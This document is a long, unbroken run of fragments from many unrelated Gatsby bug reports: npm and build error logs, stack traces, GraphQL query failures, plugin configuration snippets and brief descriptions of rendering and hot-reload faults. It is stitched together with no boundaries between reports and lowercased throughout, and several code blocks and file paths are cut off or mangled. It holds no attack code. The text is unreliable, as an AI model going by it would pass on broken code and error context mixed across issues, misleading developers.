6 info lifecycle gatsby-starter-default@0.1.0~build: gatsby-starter-default@0.1.0
7 verbose lifecycle gatsby-starter-default@0.1.0~build: unsafe-perm in lifecycle true
8 verbose lifecycle gatsby-starter-default@0.1.0~build: path: /users/pedrom/.nvm/versions/node/v10.12.0/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/users/pedrom/works/gatsby-test-json/node_modules/.bin:/users/pedrom/.nvm/versions/node/v10.12.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
9 verbose lifecycle gatsby-starter-default@0.1.0~build: cwd: /users/pedrom/works/gatsby-test-json
10 silly lifecycle gatsby-starter-default@0.1.0~build: args: [ '-c', 'gatsby build' ]
11 silly lifecycle gatsby-starter-default@0.1.0~build: returned: code: 1 signal: null
12 info lifecycle gatsby-starter-default@0.1.0~build: failed to exec build script
13 verbose stack error: gatsby-starter-default@0.1.0 build: `gatsby build`
13 verbose stack exit status 1
13 verbose stack at eventemitter.<anonymous> (/users/pedrom/.nvm/versions/node/v10.12.0/lib/node_modules/npm/node_modules/npm-lifecycle/index.js:301:16)
13 verbose stack at eventemitter.emit (events.js:182:13)
13 verbose stack at childprocess.<anonymous> (/users/pedrom/.nvm/versions/node/v10.12.0/lib/node_modules/npm/node_modules/npm-lifecycle/lib/spawn.js:55:14)
13 verbose stack at childprocess.emit (events.js:182:13)
13 verbose stack at maybeclose (internal/child_process.js:962:16)
13 verbose stack at process.childprocess._handle.onexit (internal/child_process.js:251:5)
14 verbose pkgid gatsby-starter-default@0.1.0
15 verbose cwd /users/pedrom/works/gatsby-test-json
16 verbose darwin 17.7.0
17 verbose argv "/users/pedrom/.nvm/versions/node/v10.12.0/bin/node" "/users/pedrom/.nvm/versions/node/v10.12.0/bin/npm" "run" "build"
18 verbose node v10.12.0
19 verbose npm v6.4.1
20 error code elifecycle
21 error errno 1
22 error gatsby-starter-default@0.1.0 build: `gatsby build`
22 error exit status 1
23 error failed at the gatsby-starter-default@0.1.0 build script.
23 error this is probably not a problem with npm
there is likely additional logging output above.
24 verbose exit [ 1, true ] ```
it takes 15-30sec.
the `mdx.body` values are `null`
the queries now break because of this, even though the content hasn't been changed.
the build is generating wrong ids for at least one of the h3 elements ![image](
i have two more lines at the end of the code
the original format of the image renders.
it threw an error.
in the application tab of chrome dev tools, observe that the service worker is installed
hot reloading works poorly until it is removed.
stale node cleanup takes ~40 minutes.
the background color is incorrect
gatsby does not detect the change, but thinks a new file has been added
in the log i see ```
info added file at /users/thilo/projects/undataforum/main-website/content/posts/connecting-the-dots.md
``` hot reloading does not work.
error and build fail as shown above
the build fails with lots of errors like those i have posted above.
clicking the image on ` ` does not open the original image in a new tab because `another-post/index.md` contains raw nested html: ```html
<blockquote>i love <a href=" ">gatsbyjs</a></blockquote>
the search box is filled with the raw query parameter text.
line disappears due to span being empty
### solution in directives.js in `gatsby-remark-prism` change line: ```javascript
highlightwrap(line.code)
```javascript
line.code ? (line.code = highlightwrap(line.code)) : (line.code = highlightwrap("&nbsp;"))
``` i will make a pr for this and link it here
it might be that only i am affected as the issue is annoying and would have been reported already, i think.
![image](
rendered page doesn't use layout
website is not being displayed.
<img width="585" alt="screen shot 2019-09-19 at 12 29 19 am" src=" ">
styles only load properly on hard refreshes.
callback is not a function
the styles on initial-render get messed up and/or are corrupted
please check the video recording at the top of the issue.
the `example-dir` folder links to ` ` ```html
<a class="css-1pm6ghi" href="/\\example-dir">...</a>
``` if we directly navigate to ` `, we get a white page.
it overwrote the page query with the static query ![screenshot_2019-09-15 home](
my repo flashes rapidly in different css styles the gatsby-starter-default (no changes made) does not load at all and enters infinite loop
hard refresh will stop the loop, but any change will cause the site to enter the loop again
[gatsby-error.mov 2.zip](
the background element is not covered up, leaving either white space or a blurry image
here are shots of the gatsby blog post [creating a purpose-driven media platform]( netnewswire 5.0 on os x: <img width="923" alt="screen shot 2019-09-12 at 1 49 56 pm" src=" "> reeder on ios: ![img_4160]( in some cases, such as feedbin for the web, the rss reader throws out enough of the css and html that it strips the background padding element, so things look fine: <img width="690" alt="screen shot 2019-09-12 at 1 55 33 pm" src=" ">
json files get blocked during preload when `<link />` is inserted in the head
error > unhandled rejection encountered an error trying to infer a graphql type for: `localimage___node`
there is no corresponding node with the `id` field matching: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx".
url changes to `/admin/user/123`, but the `adminusers` component is displayed match-paths.json looks like this: ``` { "path": "/admin/users/users/", "matchpath": "/admin/*" }, { "path": "/admin/users/user/", "matchpath": "/admin/*" }, { "path": "/admin/", "matchpath": "/admin/*" },
i saw all the images from the previous page load
(i'm using lazy loading which is why i don't expect them to load initially)
<img width="1437" alt="screenshot 2019-09-09 16 38 19" src=" ">
the deleted page loads.
"this site works best with javascript enabled" and no actual content
tries to prefetch these types of resources and throws errors;
![screen shot 2019-09-03 at 2 45 02 pm](
syntaxerror: unknown: unexpected token (1:14)
it crashes the chrome browser tab (see gif).
the manifest in `<head>` is still `manifest-en.webmanifest`
### considerations in production builds (`gatsby build && gatsby serve`), the correct manifest is loaded when the localized page is the initial page or if you refresh on it
in development builds (`gatsby develop`), the correct manifest is never loaded, regardless of whether you refresh or not
### `gatsby-plugin-manifest` configuration ```javascript
{ resolve: "gatsby-plugin-manifest", options: { name: "hello world", short_name: "test", start_url: "/", display: "minimal-ui", icon: "src/images/gatsby-icon.png", lang: "en", localize: [ { start_url: "/es/", lang: "es", name: "hola mundo", }, ], }, },
error the graphql query from ${project-dir}/src/components/blog/post.tsx failed
errors: originalimage.overlaywith is not a function graphql request:24:7 23 | childimagesharp { 24 | fluid(quality: 80, maxwidth: 1920, duotone: {highlight: "#ffcc5c", shadow: "#ff6f69", opacity: 50}) { | ^ 25 | ...gatsbyimagesharpfluid
url path: /generator-tests
context: { "slug": "/generator-tests" }
plugin: none
query: query[...]componentsblogposttsx921560554( $slug: string! ) { markdownremark(fields: {slug: {eq: $slug}}) { html excerpt frontmatter { ...heading title tags } } } fragment heading on markdownremarkfrontmatter { title date(formatstring: "mmmm dd, yyyy") ...hero } fragment hero on markdownremarkfrontmatter { hero { childimagesharp { fluid(quality: 80, maxwidth: 1920, duotone: {highlight: "#ffcc5c", shadow: "#ff6f69", opacity: 50}) { ...gatsbyimagesharpfluid } } } } fragment gatsbyimagesharpfluid on imagesharpfluid { base64 aspectratio src srcset sizes }
the blurred image remains when the real image is loaded
this is not a problem the real image fully covers the blurred image, but is very noticeable when the real image includes transparent sections
<img width="611" alt="screen shot 2019-08-23 at 7 17 18 pm" src=" ">
it starts generating the thumbnails but fails right in the middle of it due to a memory leak
success open and validate gatsby-configs 1.070
success load plugins 1.161
success onpreinit 0.017
success delete html and css files from previous builds 0.019
success initialize cache 0.022
success copy gatsby files 0.059
success onprebootstrap 0.027
success source and transform nodes 3.282
success building schema 0.275
success createpages 2.692
success createpagesstatefully 0.097
success onpreextractqueries 0.021
success update schema 40.457
success extract queries from components 0.573
success write out requires 0.066
success write out redirect data 0.062
success build manifest and related icons 0.060
success onpostbootstrap 0.107 info bootstrap finished - 51.925 s *** loads of loading messages, which i redacted, see pic below ***
warning: we noticed you're using the `usebuiltins` option without declaring a core-js version
currently, we assume version 2.x when no version is passed
since this default version will likely change in future versions of babel, we recommend explicitly setting the core-js version you are using via the `corejs` option
you should also be sure that the version you pass to the `corejs` option matches the version specified in your `package.json`'s `dependencies` section
if it doesn't, you need to run one of the following commands: npm install --save core-js@2 npm install --save core-js@3 yarn add core-js@2 yarn add core-js@3 error spawn enomem unhandled rejection spawn enomem see our docs page for more info on this error: error: spawn enomem - child_process.js:366 childprocess.spawn internal/child_process.js:366:11 - index.js:204 module.exports [code]/[imagemin-pngquant]/[execa]/index.js:204:26 - index.js:52 input [code]/[imagemin-pngquant]/index.js:52:13 - index.js:71 function.module.exports.buffer [code]/[imagemin]/index.js:71:31 - process-file.js:198 pipeline.tobuffer.then.sharpbuffer [code]/[gatsby-plugin-sharp]/process-file.js:198:105 error command failed with exit code 1.
info visit for documentation about this command.
exited with code 1
``` ![image](
errors on terminal ```
unhandled rejection cannot read property 'contentdigest' of undefined typeerror: cannot read property 'contentdigest' of undefined - extend-node-type.js:57 htmlcachekey [test]/[gatsby-transformer-remark]/extend-node-type.js:57:80 - extend-node-type.js:337 object.gethtml [as generatehtml] [test]/[gatsby-transformer-remark]/extend-node-type.js:337:42 - index.js:150 getimagecaption [test]/[gatsby-remark-images]/index.js:150:21 - index.js:306 _callee$ [test]/[gatsby-remark-images]/index.js:306:54
i am building a gatsby website with `gatsby build` and the css output only contains this: ```css
.tl-edges{max-width:100%;overflow-x:hidden}.tl-wrapper{width:100%;float:left;position:relative}.tl-wrapper+.tl-wrapper{margin-left:-100%;margin-right:0}
terminal is unusuable.
/** * @param {import('gatsby').prerenderhtmlargs} args */
const onprerenderhtml = ({ getheadcomponents }) => { // getheadcomponents type signature is `any[]`
errors on terminal [full log]( ``` error #11321 plugin "gatsby-plugin-mdx" threw an error while running the oncreatenode lifecycle: definition.identifier.touppercase is not a function // here goes the trace success building schema - 0.201 s error definition.identifier.touppercase is not a function // here goes the trace
text input is not shown.
failed build due to javascript heap out of memory error: ```
fatal error: ineffective mark-compacts near heap limit allocation failed - javascript heap out of memory 1: 00007ff75ab9c6aa v8::internal::gcidletimehandler::gcidletimehandler+4506 2: 00007ff75ab77416 node::makecallback+4534 3: 00007ff75ab77d90 node_module_register+2032 4: 00007ff75ae9189e v8::internal::fatalprocessoutofmemory+846 5: 00007ff75ae917cf v8::internal::fatalprocessoutofmemory+639 6: 00007ff75b077f94 v8::internal::heap::maxheapgrowingfactor+9620 7: 00007ff75b06ef76 v8::internal::scavengejob::operator=+24550 8: 00007ff75b06d5cc v8::internal::scavengejob::operator=+17980 9: 00007ff75b076317 v8::internal::heap::maxheapgrowingfactor+2327
10: 00007ff75b076396 v8::internal::heap::maxheapgrowingfactor+2454
11: 00007ff75b1a0637 v8::internal::factory::newfillerobject+55
12: 00007ff75b21d826 v8::internal::operator<<+73494
13: 000000b733bdc5c1
various offline plugin-specific issues which previously didn't occur due to incorrect `package.json`
errors out; as if it's not reading dependencies correctly anymore.
modules could not be resolved
it looks for the module relative to the script that called `@import`
standard behavior when not using `resolve-url-loader`
also rather unfortunate.
we receive an error that crashes the app: ``` error #85907 graphql there was an error in your graphql query: - unknown field 'docs' on type 'query'
file: node_modules/gatsby-theme-documentation/src/templates/doc.js
``` ![image]( ## related - #11278
![image](
internal/modules/cjs/loader.js:628 throw err; ^ error: cannot find module '/root/.npm/_npx/17/lib/node_modules/gatsby/node_modules/core-js/scripts/postinstall' at function.module._resolvefilename (internal/modules/cjs/loader.js:625:15) at function.module._load (internal/modules/cjs/loader.js:527:27) at function.module.runmain (internal/modules/cjs/loader.js:840:10) at internal/main/run_main_module.js:17:11 { code: 'module_not_found', requirestack: []
internal/modules/cjs/loader.js:628 throw err; ^ error: cannot find module '/root/.npm/_npx/17/lib/node_modules/gatsby/node_modules/core-js-pure/scripts/postinstall' at function.module._resolvefilename (internal/modules/cjs/loader.js:625:15) at function.module._load (internal/modules/cjs/loader.js:527:27) at function.module.runmain (internal/modules/cjs/loader.js:840:10) at internal/main/run_main_module.js:17:11 { code: 'module_not_found', requirestack: []
internal/modules/cjs/loader.js:628 throw err; ^ error: cannot find module '/root/.npm/_npx/17/lib/node_modules/gatsby/node_modules/gatsby-telemetry/src/postinstall.js' at function.module._resolvefilename (internal/modules/cjs/loader.js:625:15) at function.module._load (internal/modules/cjs/loader.js:527:27) at function.module.runmain (internal/modules/cjs/loader.js:840:10) at internal/main/run_main_module.js:17:11 { code: 'module_not_found', requirestack: []
npm err! code elifecycle
npm err! errno 1
npm err! gatsby-telemetry@1.1.11 postinstall: `node src/postinstall.js`
npm err! exit status 1
npm err! failed at the gatsby-telemetry@1.1.11 postinstall script.
npm err! this is probably not a problem with npm
there is likely additional logging output above
npm err! a complete log of this run can be found in:
npm err! /root/.npm/_logs/2019-08-01t21_57_39_926z-debug.log
install for [ 'gatsby@latest' ] failed with code 1
``` this may be an issue with this commit:
returns a console error which for what i found it's something that `.finally()` function is quite new and maybe is not fully supported yet
unhandled promise rejection typeerror: "this.loadpagedatajson(...).then(...).finally is not a function"
``` how it looks like in firefox (v68.0.1)
![firefox version]( also i\'m using `"antd": "^3.12.3"` package to handle the ui and in this css class if you change `flex-direction: column` to `row` it looks ok but the error still persists
.ant-layout { display: flex; flex: auto; flex-direction: column; min-height: 0; background: #f0f2f5;
when i click on the line number bar i can't add a breakpoint
if i right-click and choose "add breakpoint" the breakpoint is not showing up
just noticed that i'm able to add a breakpoint but on the first line only.
state is intermittently lost, roughly 25% of the time
`error: command failed: openssl genrsa -out c:\\users\\user name with spaces\\appdata\\local\\devcert\\config\\devcert-ca-root.key 2048`
and process exits
$ gatsby build
success open and validate gatsby-configs - 0.089 s
success load plugins - 0.166 s
success onpreinit - 0.017 s
success delete html and css files from previous builds - 0.037 s
success initialize cache - 0.025 s
success copy gatsby files - 0.064 s
success onprebootstrap - 0.035 s
starting to fetch data from contentful
fetching default locale
default locale is : en-us
contenttypes fetched 9 error #11321 plugin "gatsby-source-contentful" threw an error while running the sourcenodes lifecycle: the plugin "gatsby-source-contentful" deleted a node of a type owned by another plugin
the node type "contentfulartikel" is owned by "undefined"
the node object passed to "deletenode": { "title": "test", "slug": "test", "date": "2019-07-01t00:00", "isnews": false, "usearticledisplayautomatism": false, "isindexable": false, "hassitemapentry": false, "category___node": "66fa2e59-35c9-5e48-ae15-788357176313", "primarypicture___node": [ "57f8dca3-95fa-57f6-8fab-645ad3c53ba4" ], "id": "a8cb3ba2-47e6-5045-be60-d102bdbc4c63", "contentful_id": "5nup2bftdfbqkmbd1mz772", "createdat": "2019-07-29t15:55:29.459z", "updatedat": "2019-07-29t15:58:21.361z", "parent": "artikel", "children": [ "57f8dca3-95fa-57f6-8fab-645ad3c53ba4" ], "internal": { "type": "contentfulartikel", "contentdigest": "2aec8d5cc9d01c24d09a86acc479c8df", "owner": "gatsby-source-contentful" }, "node_locale": "en-us"
} the plugin deleting the node: { "resolve": "/xxx/node_modules/gatsby-source-contentful", "id": "b8fcd892-632b-5ae5-aecf-6a3156d9aa8f", "name": "gatsby-source-contentful", "version": "2.1.14", "pluginoptions": { "plugins": [], "spaceid": "xxx", "environment": "xxx", "accesstoken": "xxx", "host": "cdn.contentful.com" }, "nodeapis": [ "setfieldsongraphqlnodetype", "onprebootstrap", "sourcenodes", "onpreextractqueries" ], "browserapis": [], "ssrapis": [], "pluginfilepath": "/xxx/node_modules/gatsby-source-contentful"
`/txt/*` is sorted after `/*`
it shouldn't
you get the error above and hence cannot do anything (the error triggers the react overlay error and does not let you interact with the site at all)
clicking on the link makes me sad because i wanted to learn more about how great mdx is but can't find the page.
ssr styles are rendered until some state changed and component re-rendering happens
i was able to create a hotfix by using the material-ui `<nossr>` component, but this is just a stop gap measure until i can figure out what is going on.
line numbers do **not** appear in rendered blog page.
updating to `gatsby-transformer-remark` version 2.6.0, keeping everything else the same, causes the bug
![image]( relevant part of `package.json` file:
``` "dependencies": { "gatsby": "^2.13.25", "gatsby-plugin-typography": "^2.3.2", "gatsby-remark-prismjs": "^3.3.3", "gatsby-source-filesystem": "^2.1.5", "gatsby-transformer-remark": "2.6.0", "prismjs": "^1.16.0", "react": "^16.8.6", "react-dom": "^16.8.6", "react-typography": "^0.16.19", "typeface-merriweather": "0.0.72", "typeface-montserrat": "0.0.75", "typography": "^0.16.19", "typography-theme-wordpress-2016": "^0.16.19" },
app crashes with this error: ```
typeerror: cannot read property 'page' of undefined
/users/joey/code/sb/.cache/root.js:44 41 | // resetting `basepath`/`baseuri` keeps current behaviour 42 | // to not introduce breaking change
43 | // remove this in v3
> 44 | const routehandler = props => ( 45 | <basecontext.provider 46 | value={{ 47 | baseuri: `/`,
view compiled
ensureresources.render
/users/joey/code/sb/.cache/ensure-resources.js:63 60 | } 61 | // check if location has changed on a page using internal routing 62 | // via matchpath configuration.
> 63 | if ( 64 | this.state.location.key !== nextstate.location.key && 65 | nextstate.pageresources.page && 66 | (nextstate.pageresources.page.matchpath ||
view compiled
19 stack frames were expanded.
finishclasscomponent
node_modules/react-dom/cjs/react-dom.development.js:14742
updateclasscomponent
node_modules/react-dom/cjs/react-dom.development.js:14697
node_modules/react-dom/cjs/react-dom.development.js:15645
performunitofwork
node_modules/react-dom/cjs/react-dom.development.js:19313
node_modules/react-dom/cjs/react-dom.development.js:19353
node_modules/react-dom/cjs/react-dom.development.js:19436
performworkonroot
node_modules/react-dom/cjs/react-dom.development.js:20343
performwork
node_modules/react-dom/cjs/react-dom.development.js:20255
performsyncwork
node_modules/react-dom/cjs/react-dom.development.js:20229
requestwork
node_modules/react-dom/cjs/react-dom.development.js:20098
schedulework
node_modules/react-dom/cjs/react-dom.development.js:19912
schedulerootupdate
node_modules/react-dom/cjs/react-dom.development.js:20573
updatecontaineratexpirationtime
node_modules/react-dom/cjs/react-dom.development.js:20601
updatecontainer
node_modules/react-dom/cjs/react-dom.development.js:20658
reactroot../node_modules/react-dom/cjs/react-dom.development.js.reactroot.render
node_modules/react-dom/cjs/react-dom.development.js:20954
(anonymous function)
node_modules/react-dom/cjs/react-dom.development.js:21091
unbatchedupdates
node_modules/react-dom/cjs/react-dom.development.js:20460
legacyrendersubtreeintocontainer
node_modules/react-dom/cjs/react-dom.development.js:21087
node_modules/react-dom/cjs/react-dom.development.js:21205
19 stack frames were expanded.
(anonymous function)
/users/joey/code/sb/.cache/app.js:38 35 | * 36 | * let's warn if we find service workers in development
> 38 | if (`serviceworker` in navigator) { 39 | navigator.serviceworker.getregistrations().then(registrations => { 40 | if (registrations.length > 0) 41 | console.warn(
gatsby crashes with the following output: ```
/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/yoga-layout-prebuilt/yoga-layout/build/release/nbind.js:53 throw ex; ^ typeerror: cannot read property 'internal' of undefined at emitter.on.action (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/gatsby/dist/bootstrap/page-hot-reloader.js:26:22) at /rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/mitt/dist/mitt.js:1:268 at array.map (<anonymous>) at object.emit (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/mitt/dist/mitt.js:1:252) at store.subscribe (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/gatsby/dist/redux/index.js:74:11) at dispatch (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/redux/lib/redux.js:227:7) at action (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/gatsby/dist/redux/index.js:58:88) at /rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/redux-thunk/lib/index.js:14:16 at object.deletenode (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/redux/lib/redux.js:481:12) at emitter.on.action (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/gatsby/dist/internal-plugins/internal-data-bridge/gatsby-node.js:160:23) at /rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/mitt/dist/mitt.js:1:268 at array.map (<anonymous>) at object.emit (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/mitt/dist/mitt.js:1:252) at store.subscribe (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/gatsby/dist/redux/index.js:74:11) at dispatch (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/redux/lib/redux.js:227:7) at action (/rbd/pnpm-volume/88bed991-be5f-425b-8a6b-4648d2bfe23f/node_modules/gatsby/dist/redux/index.js:58:88)
two tests fail, then the testing program keeps counting up forever, not exiting
failing tests are: - graphql field extensions - allows creating a cutom field extension
- graphql field extensions - allows creating a custom field extension (used in type builder) i ran a git bisect
in earlier commits (not sure the threshold for this) the same tests fail but the tester exits, but not before outputting this message: ```
console.log packages/gatsby-source-wordpress/src/http-exception-handler.js:11 the request failed with error code "undefined"
``` further back in history the tests pass
the bisect led me to the first commit where the tests fail: 4f9c790b1c1472ed6fb0e020a172766730871e5d this commit adds the tests and, judging by the commit message, also the code which is being tested.
imports are undefined until rebooting the server.
i see an empty page
sometimes i can see the 404 page flash before it disappears.
all image paths start from the root (ie: `/static`)
`sharp.concurrency` returns the number of cpus it detected after being failing to be set by cpu-core-count.js.
the message appears.
you do see the error
### motivation to prevent confusion about false negative error reporting
### related maybe related to #14395 or #11456
![screenshot](
the svg only appears in develop mode.
![image]( ![image](
- the first codeblock visibly has no bottom margin
![screenshot]( - the second codeblock is missing the blank line
![screenshot](
plugin for es6 compilation is required to get `develop` to run.
the shadow in the site doesn't resolve and it fallsback to the theme's shadow
error message:
warning: each child in a list should have a unique "key" prop
check the top-level render call using <body>
see for more information
in emotioncsspropinternal
i did look through the site source and the npm theme package but cannot seem to find the error.
blank page and error in the terminal: ```
page not found /404.html
error loading a result for the page query in "/asdf"
query was not run and no cached result was found.
page not found /asdf
client-only routes not working
the page doesn't load, and there's many errors in the console.
`gatsby develop` fails to run with `error: cannot find module 'slash'`
returned entire article.
error: enoent: no such file or directory, open '/sandbox/public/page-data/404.html/page-data.json'
however, upon deployment, the images are missing and do not show up in the `/public/static/` folder
![image]( ![image]( ![image]( file is missing from the `public/static` folder
an image that is too large is rendered
i see no errors in the console.
the background color of the h1 text is red which is the background color of the h1 header of the route component for "/" [
however the content of the h1 text is still correct, it is just the style of the corresponding div-container being mixed up with other component.
[repeater_field_name]_[post_type] will throw an error in graphiql
it doesn't ### failed attempts - clear cache with `gatsby clean`
- re-install `node`
- cloning new repository
- reset entire macos
see image above it's returned null
in the fully static mode it redirects back to the root of the app instead of rendering my 404 component
this was recorded when running `gatsby serve` in that repo ![kapture 2019-06-20 at 15 23 23]( even after changing the url, it redirects back to the root of the app instead.
error unhandled rejection fetcherror: request to failed, reason: self signed certificate - index.js:1455 clientrequest.<anonymous> [hello-epics]/[node-fetch]/lib/index.js:1455:11 - destroy.js:82 emiterrornt internal/streams/destroy.js:82:8 - destroy.js:50 emiterrorandclosent internal/streams/destroy.js:50:3 - next_tick.js:63 process._tickcallback internal/process/next_tick.js:63:19
critical loads the image on dom entry, loading="eager" behaves like loading="lazy" ### other info it looks like the gatsby-image source still references the props.critical instead of checking props.loading
#l216 oddly there is a warning that gets thrown here to switch to the new loading prop vs eager: #l36
![image](
[myusername@server gatsby-site]$ npm run build > gatsby-starter-default@0.1.0 build /home/myusername/gatsby-site
> gatsby build success open and validate gatsby-configs - 0.011 s
success load plugins - 0.491 s
success onpreinit - 0.010 s
success delete html and css files from previous builds - 0.010 s
success initialize cache - 0.021 s
success copy gatsby files - 0.043 s
success onprebootstrap - 0.012 s
success source and transform nodes - 0.073 s
success building schema - 0.312 s
success createpages - 0.002 s
/home/myusername/gatsby-site/src/pages/404.js
error unhandled rejection error: eacces: permission denied, scandir '/home' - sync.js:288 globsync._readdir [gatsby-site]/[glob]/sync.js:288:41 - sync.js:137 globsync._processreaddir [gatsby-site]/[glob]/sync.js:137:22 - sync.js:132 globsync._process [gatsby-site]/[glob]/sync.js:132:10 - sync.js:207 globsync._processreaddir [gatsby-site]/[glob]/sync.js:207:10 - sync.js:132 globsync._process [gatsby-site]/[glob]/sync.js:132:10 - sync.js:48 new globsync [gatsby-site]/[glob]/sync.js:48:10 - sync.js:26 function.globsync [as sync] [gatsby-site]/[glob]/sync.js:26:10 - index.js:29 truecasepathsync [gatsby-site]/[true-case-path]/index.js:29:15 - public.js:198 actions.createpage [gatsby-site]/[gatsby]/dist/redux/actions/public.js:198:41 - redux.js:468 [gatsby-site]/[redux]/lib/redux.js:468:35 - api-runner-node.js:68 doubleboundactioncreators.(anonymous function).args [gatsby-site]/[gatsby]/dist/utils/api-runner-node.js:68:20 - gatsby-node.js:141 _createpage [gatsby-site]/[gatsby-plugin-page-creator]/gatsby-node.js:141:3 - gatsby-node.js:76 [gatsby-site]/[gatsby-plugin-page-creator]/gatsby-node.js:76:22 - array.foreach - gatsby-node.js:75 object._callee$ [gatsby-site]/[gatsby-plugin-page-creator]/gatsby-node.js:75:19
error loading a result for the staticquery in "/componentwhofails.js"
query was not run and no cached result was found.
getting this error: ```
project_root/node_modules/yoga-layout-prebuilt/yoga-layout/build/release/nbind.js:53 throw ex; ^ rangeerror: maximum call stack size exceeded at array.values (<anonymous>) at object.console.error
they don't behave the same
`react` is installed because `gatsby-cli` has `dependencies` with `react`.
`props.location.state` is `undefined`.
an error will be thrown
typeerror: cannot read property "minimizer" of undefined
the site cannot be verified and the following message is displayed on verification attempt: "verification failed ..
using the google tag manager method ..
the google tag manager snippet on your site is in the wrong location"
`missing resources for /` occurs.
path is changed to invalid one and a node is not converted to file node.
gatsby does not output path of deleted file(s).
old duotone colurs render
warn replace autoprefixer browsers option to browserslist config
use browserslist key in package.json or .browserslistrc file
using browsers option cause some error
browserslist config can be used for babel, autoprefixer, postcss-normalize and other tools
if you really need to use option, rename it to overridebrowserslist
learn more at: #readme
``` `done compiled successfully in 9137ms`
{ "data": { "allmarkdownremark": { "edges": [ { "node": { "excerpt": "paragraph one sentence one
sentence two.paragraph two sentence one.paragraph three sentence one." } } ] } }
dom nodes keeps increasing on each click
![](
<img class="gatsby-resp-image-image" alt="" text="">
> gatsby-starter-default@0.1.0 build c:\\users\\wardpeeters\\projectswin\\tmp\\gatsby\\my-default-starter
> gatsby build internal/modules/cjs/loader.js:584 throw err; ^ error: cannot find module 'ink' at function.module._resolvefilename (internal/modules/cjs/loader.js:582:15) at function.module._load (internal/modules/cjs/loader.js:508:25) at module.require (internal/modules/cjs/loader.js:637:17) at require (internal/modules/cjs/helpers.js:22:18) at object.<anonymous> (c:\\users\\wardpeeters\\projectswin\\tmp\\gatsby\\my-default-starter\ ode_modules\\gatsby\ ode_modules\\gatsby-cli\\lib\ eporter\ eporters\\ink\\index.js:10:12) at module._compile (internal/modules/cjs/loader.js:701:30) at object.module._extensions..js (internal/modules/cjs/loader.js:712:10) at module.load (internal/modules/cjs/loader.js:600:32) at trymoduleload (internal/modules/cjs/loader.js:539:12) at function.module._load (internal/modules/cjs/loader.js:531:3)
``` copied from #issuecomment-495895945
develop and build work just fine, but the warning is an annoyance.
![blurup]( (this gif is a real-time recording using firefox's gprs network throttling preset)
in this example, the css class `css-qnh44z`is declared for every instance of the h1
<div> <style data-emotion-css="qnh44z">.css-qnh44z{color:#bad101;}</style> <h1 class="css-qnh44z en8bjfu0">hello world</h1> <style data-emotion-css="qnh44z">.css-qnh44z{color:#bad101;}</style> <h1 class="css-qnh44z en8bjfu0">bonjour world</h1> <style data-emotion-css="qnh44z">.css-qnh44z{color:#bad101;}</style> <h1 class="css-qnh44z en8bjfu0">ciao world</h1>
``` ### remedy
simply styling the outer node fixes the problem: ```jsx
import react from "react"
import styled from "@emotion/styled" const titlestyle = styled.h1`color: #bad101;`
const title = ({ children }) => <titlestyle>{children}</titlestyle>
const nowstyled = styled.div`` export default () => ( <nowstyled> <title>hello world</title> <title>bonjour world</title> <title>ciao world</title> </nowstyled>
images and icons are displayed really large on the screen before the page actually loads and renders everything correctly
lasts half a second or so.
gatsby fails to start ```
npm warn lifecycle the node binary used for scripts is /var/folders/zr/18gw2jpj4xn9lfnl8rktth7m0000gp/t/yarn--1558714436525-0.14726619247761996/node but npm is using /users/cj/.nvm/versions/node/v12.3.1/bin/node itself
use the `--scripts-prepend-node-path` option to include the path for the node binary npm was executed with
> gatsby-starter-default@0.1.0 develop /users/cj/companies/aspenandpine/aspenandpine-gatsby
> gatsby develop success open and validate gatsby-configs 0.006 s
success load plugins 1.127 s
success onpreinit 0.010 s
success initialize cache 0.061 s
success copy gatsby files 0.090 s
success onprebootstrap 0.018 s gatsby-source-shopify/aspen-pine starting to fetch data from shopify gatsby-source-shopify/aspen-pine fetched and processed blogs: 1433.211ms gatsby-source-shopify/aspen-pine fetched and processed producttypes: 1461.054ms gatsby-source-shopify/aspen-pine fetched and processed policies: 1477.566ms
error (node:47418) [dep0066] deprecationwarning: outgoingmessage.prototype._headers is deprecated gatsby-source-shopify/aspen-pine fetched and processed collections: 3005.577ms gatsby-source-shopify/aspen-pine fetched and processed articles: 3365.866ms
error error an error occured while sourcing data
error - message: timeout
error query: """ query getproducts($first: int!, $after: string) { shop { products(first: $first, after: $after) { pageinfo { hasnextpage } edges { cursor node { availableforsale createdat description descriptionhtml handle id images(first: 250) { edges { node { id alttext originalsrc } } } onlinestoreurl options { id name values } pricerange { minvariantprice { amount currencycode } maxvariantprice { amount currencycode } } producttype publishedat tags title updatedat variants(first: 250) { edges { node { availableforsale compareatprice id image { alttext id originalsrc } price selectedoptions { name value } sku title weight weightunit } } } vendor } } } } } """
variables: first: 250 after: null
success source and transform nodes 19.002 s
warning multiple node fields resolve to the same graphql field `shopifycollection.products` - [`products`, `products___node`]
gatsby will use `products___node`.
error unhandled rejection
a lot of warnings ### description some of the above warnings are fairly easy to fix
for example, several that have a title do not have a language, e.g
title=gatsby-config.js -> js:title=gatsby-config.js # title is not stripped unless it has a language
javascript= -> javascript # remove the = sign
.json -> json # remove the dot
jsx:jsx:title=src/pages/index.js -> jsx:title=src/pages/index.js # remove the duplicate language
``` others still are not using the correct or available alias, e.g
gql -> graphql
env -> shell
mdx -> md # mdx is not a supported extension yet (hopefully soon!)
``` this issue can be marked done when there are zero warnings
a great approach would be to use an editor like vscode, search for the string pattern in the docs/ folder, and fix the errors
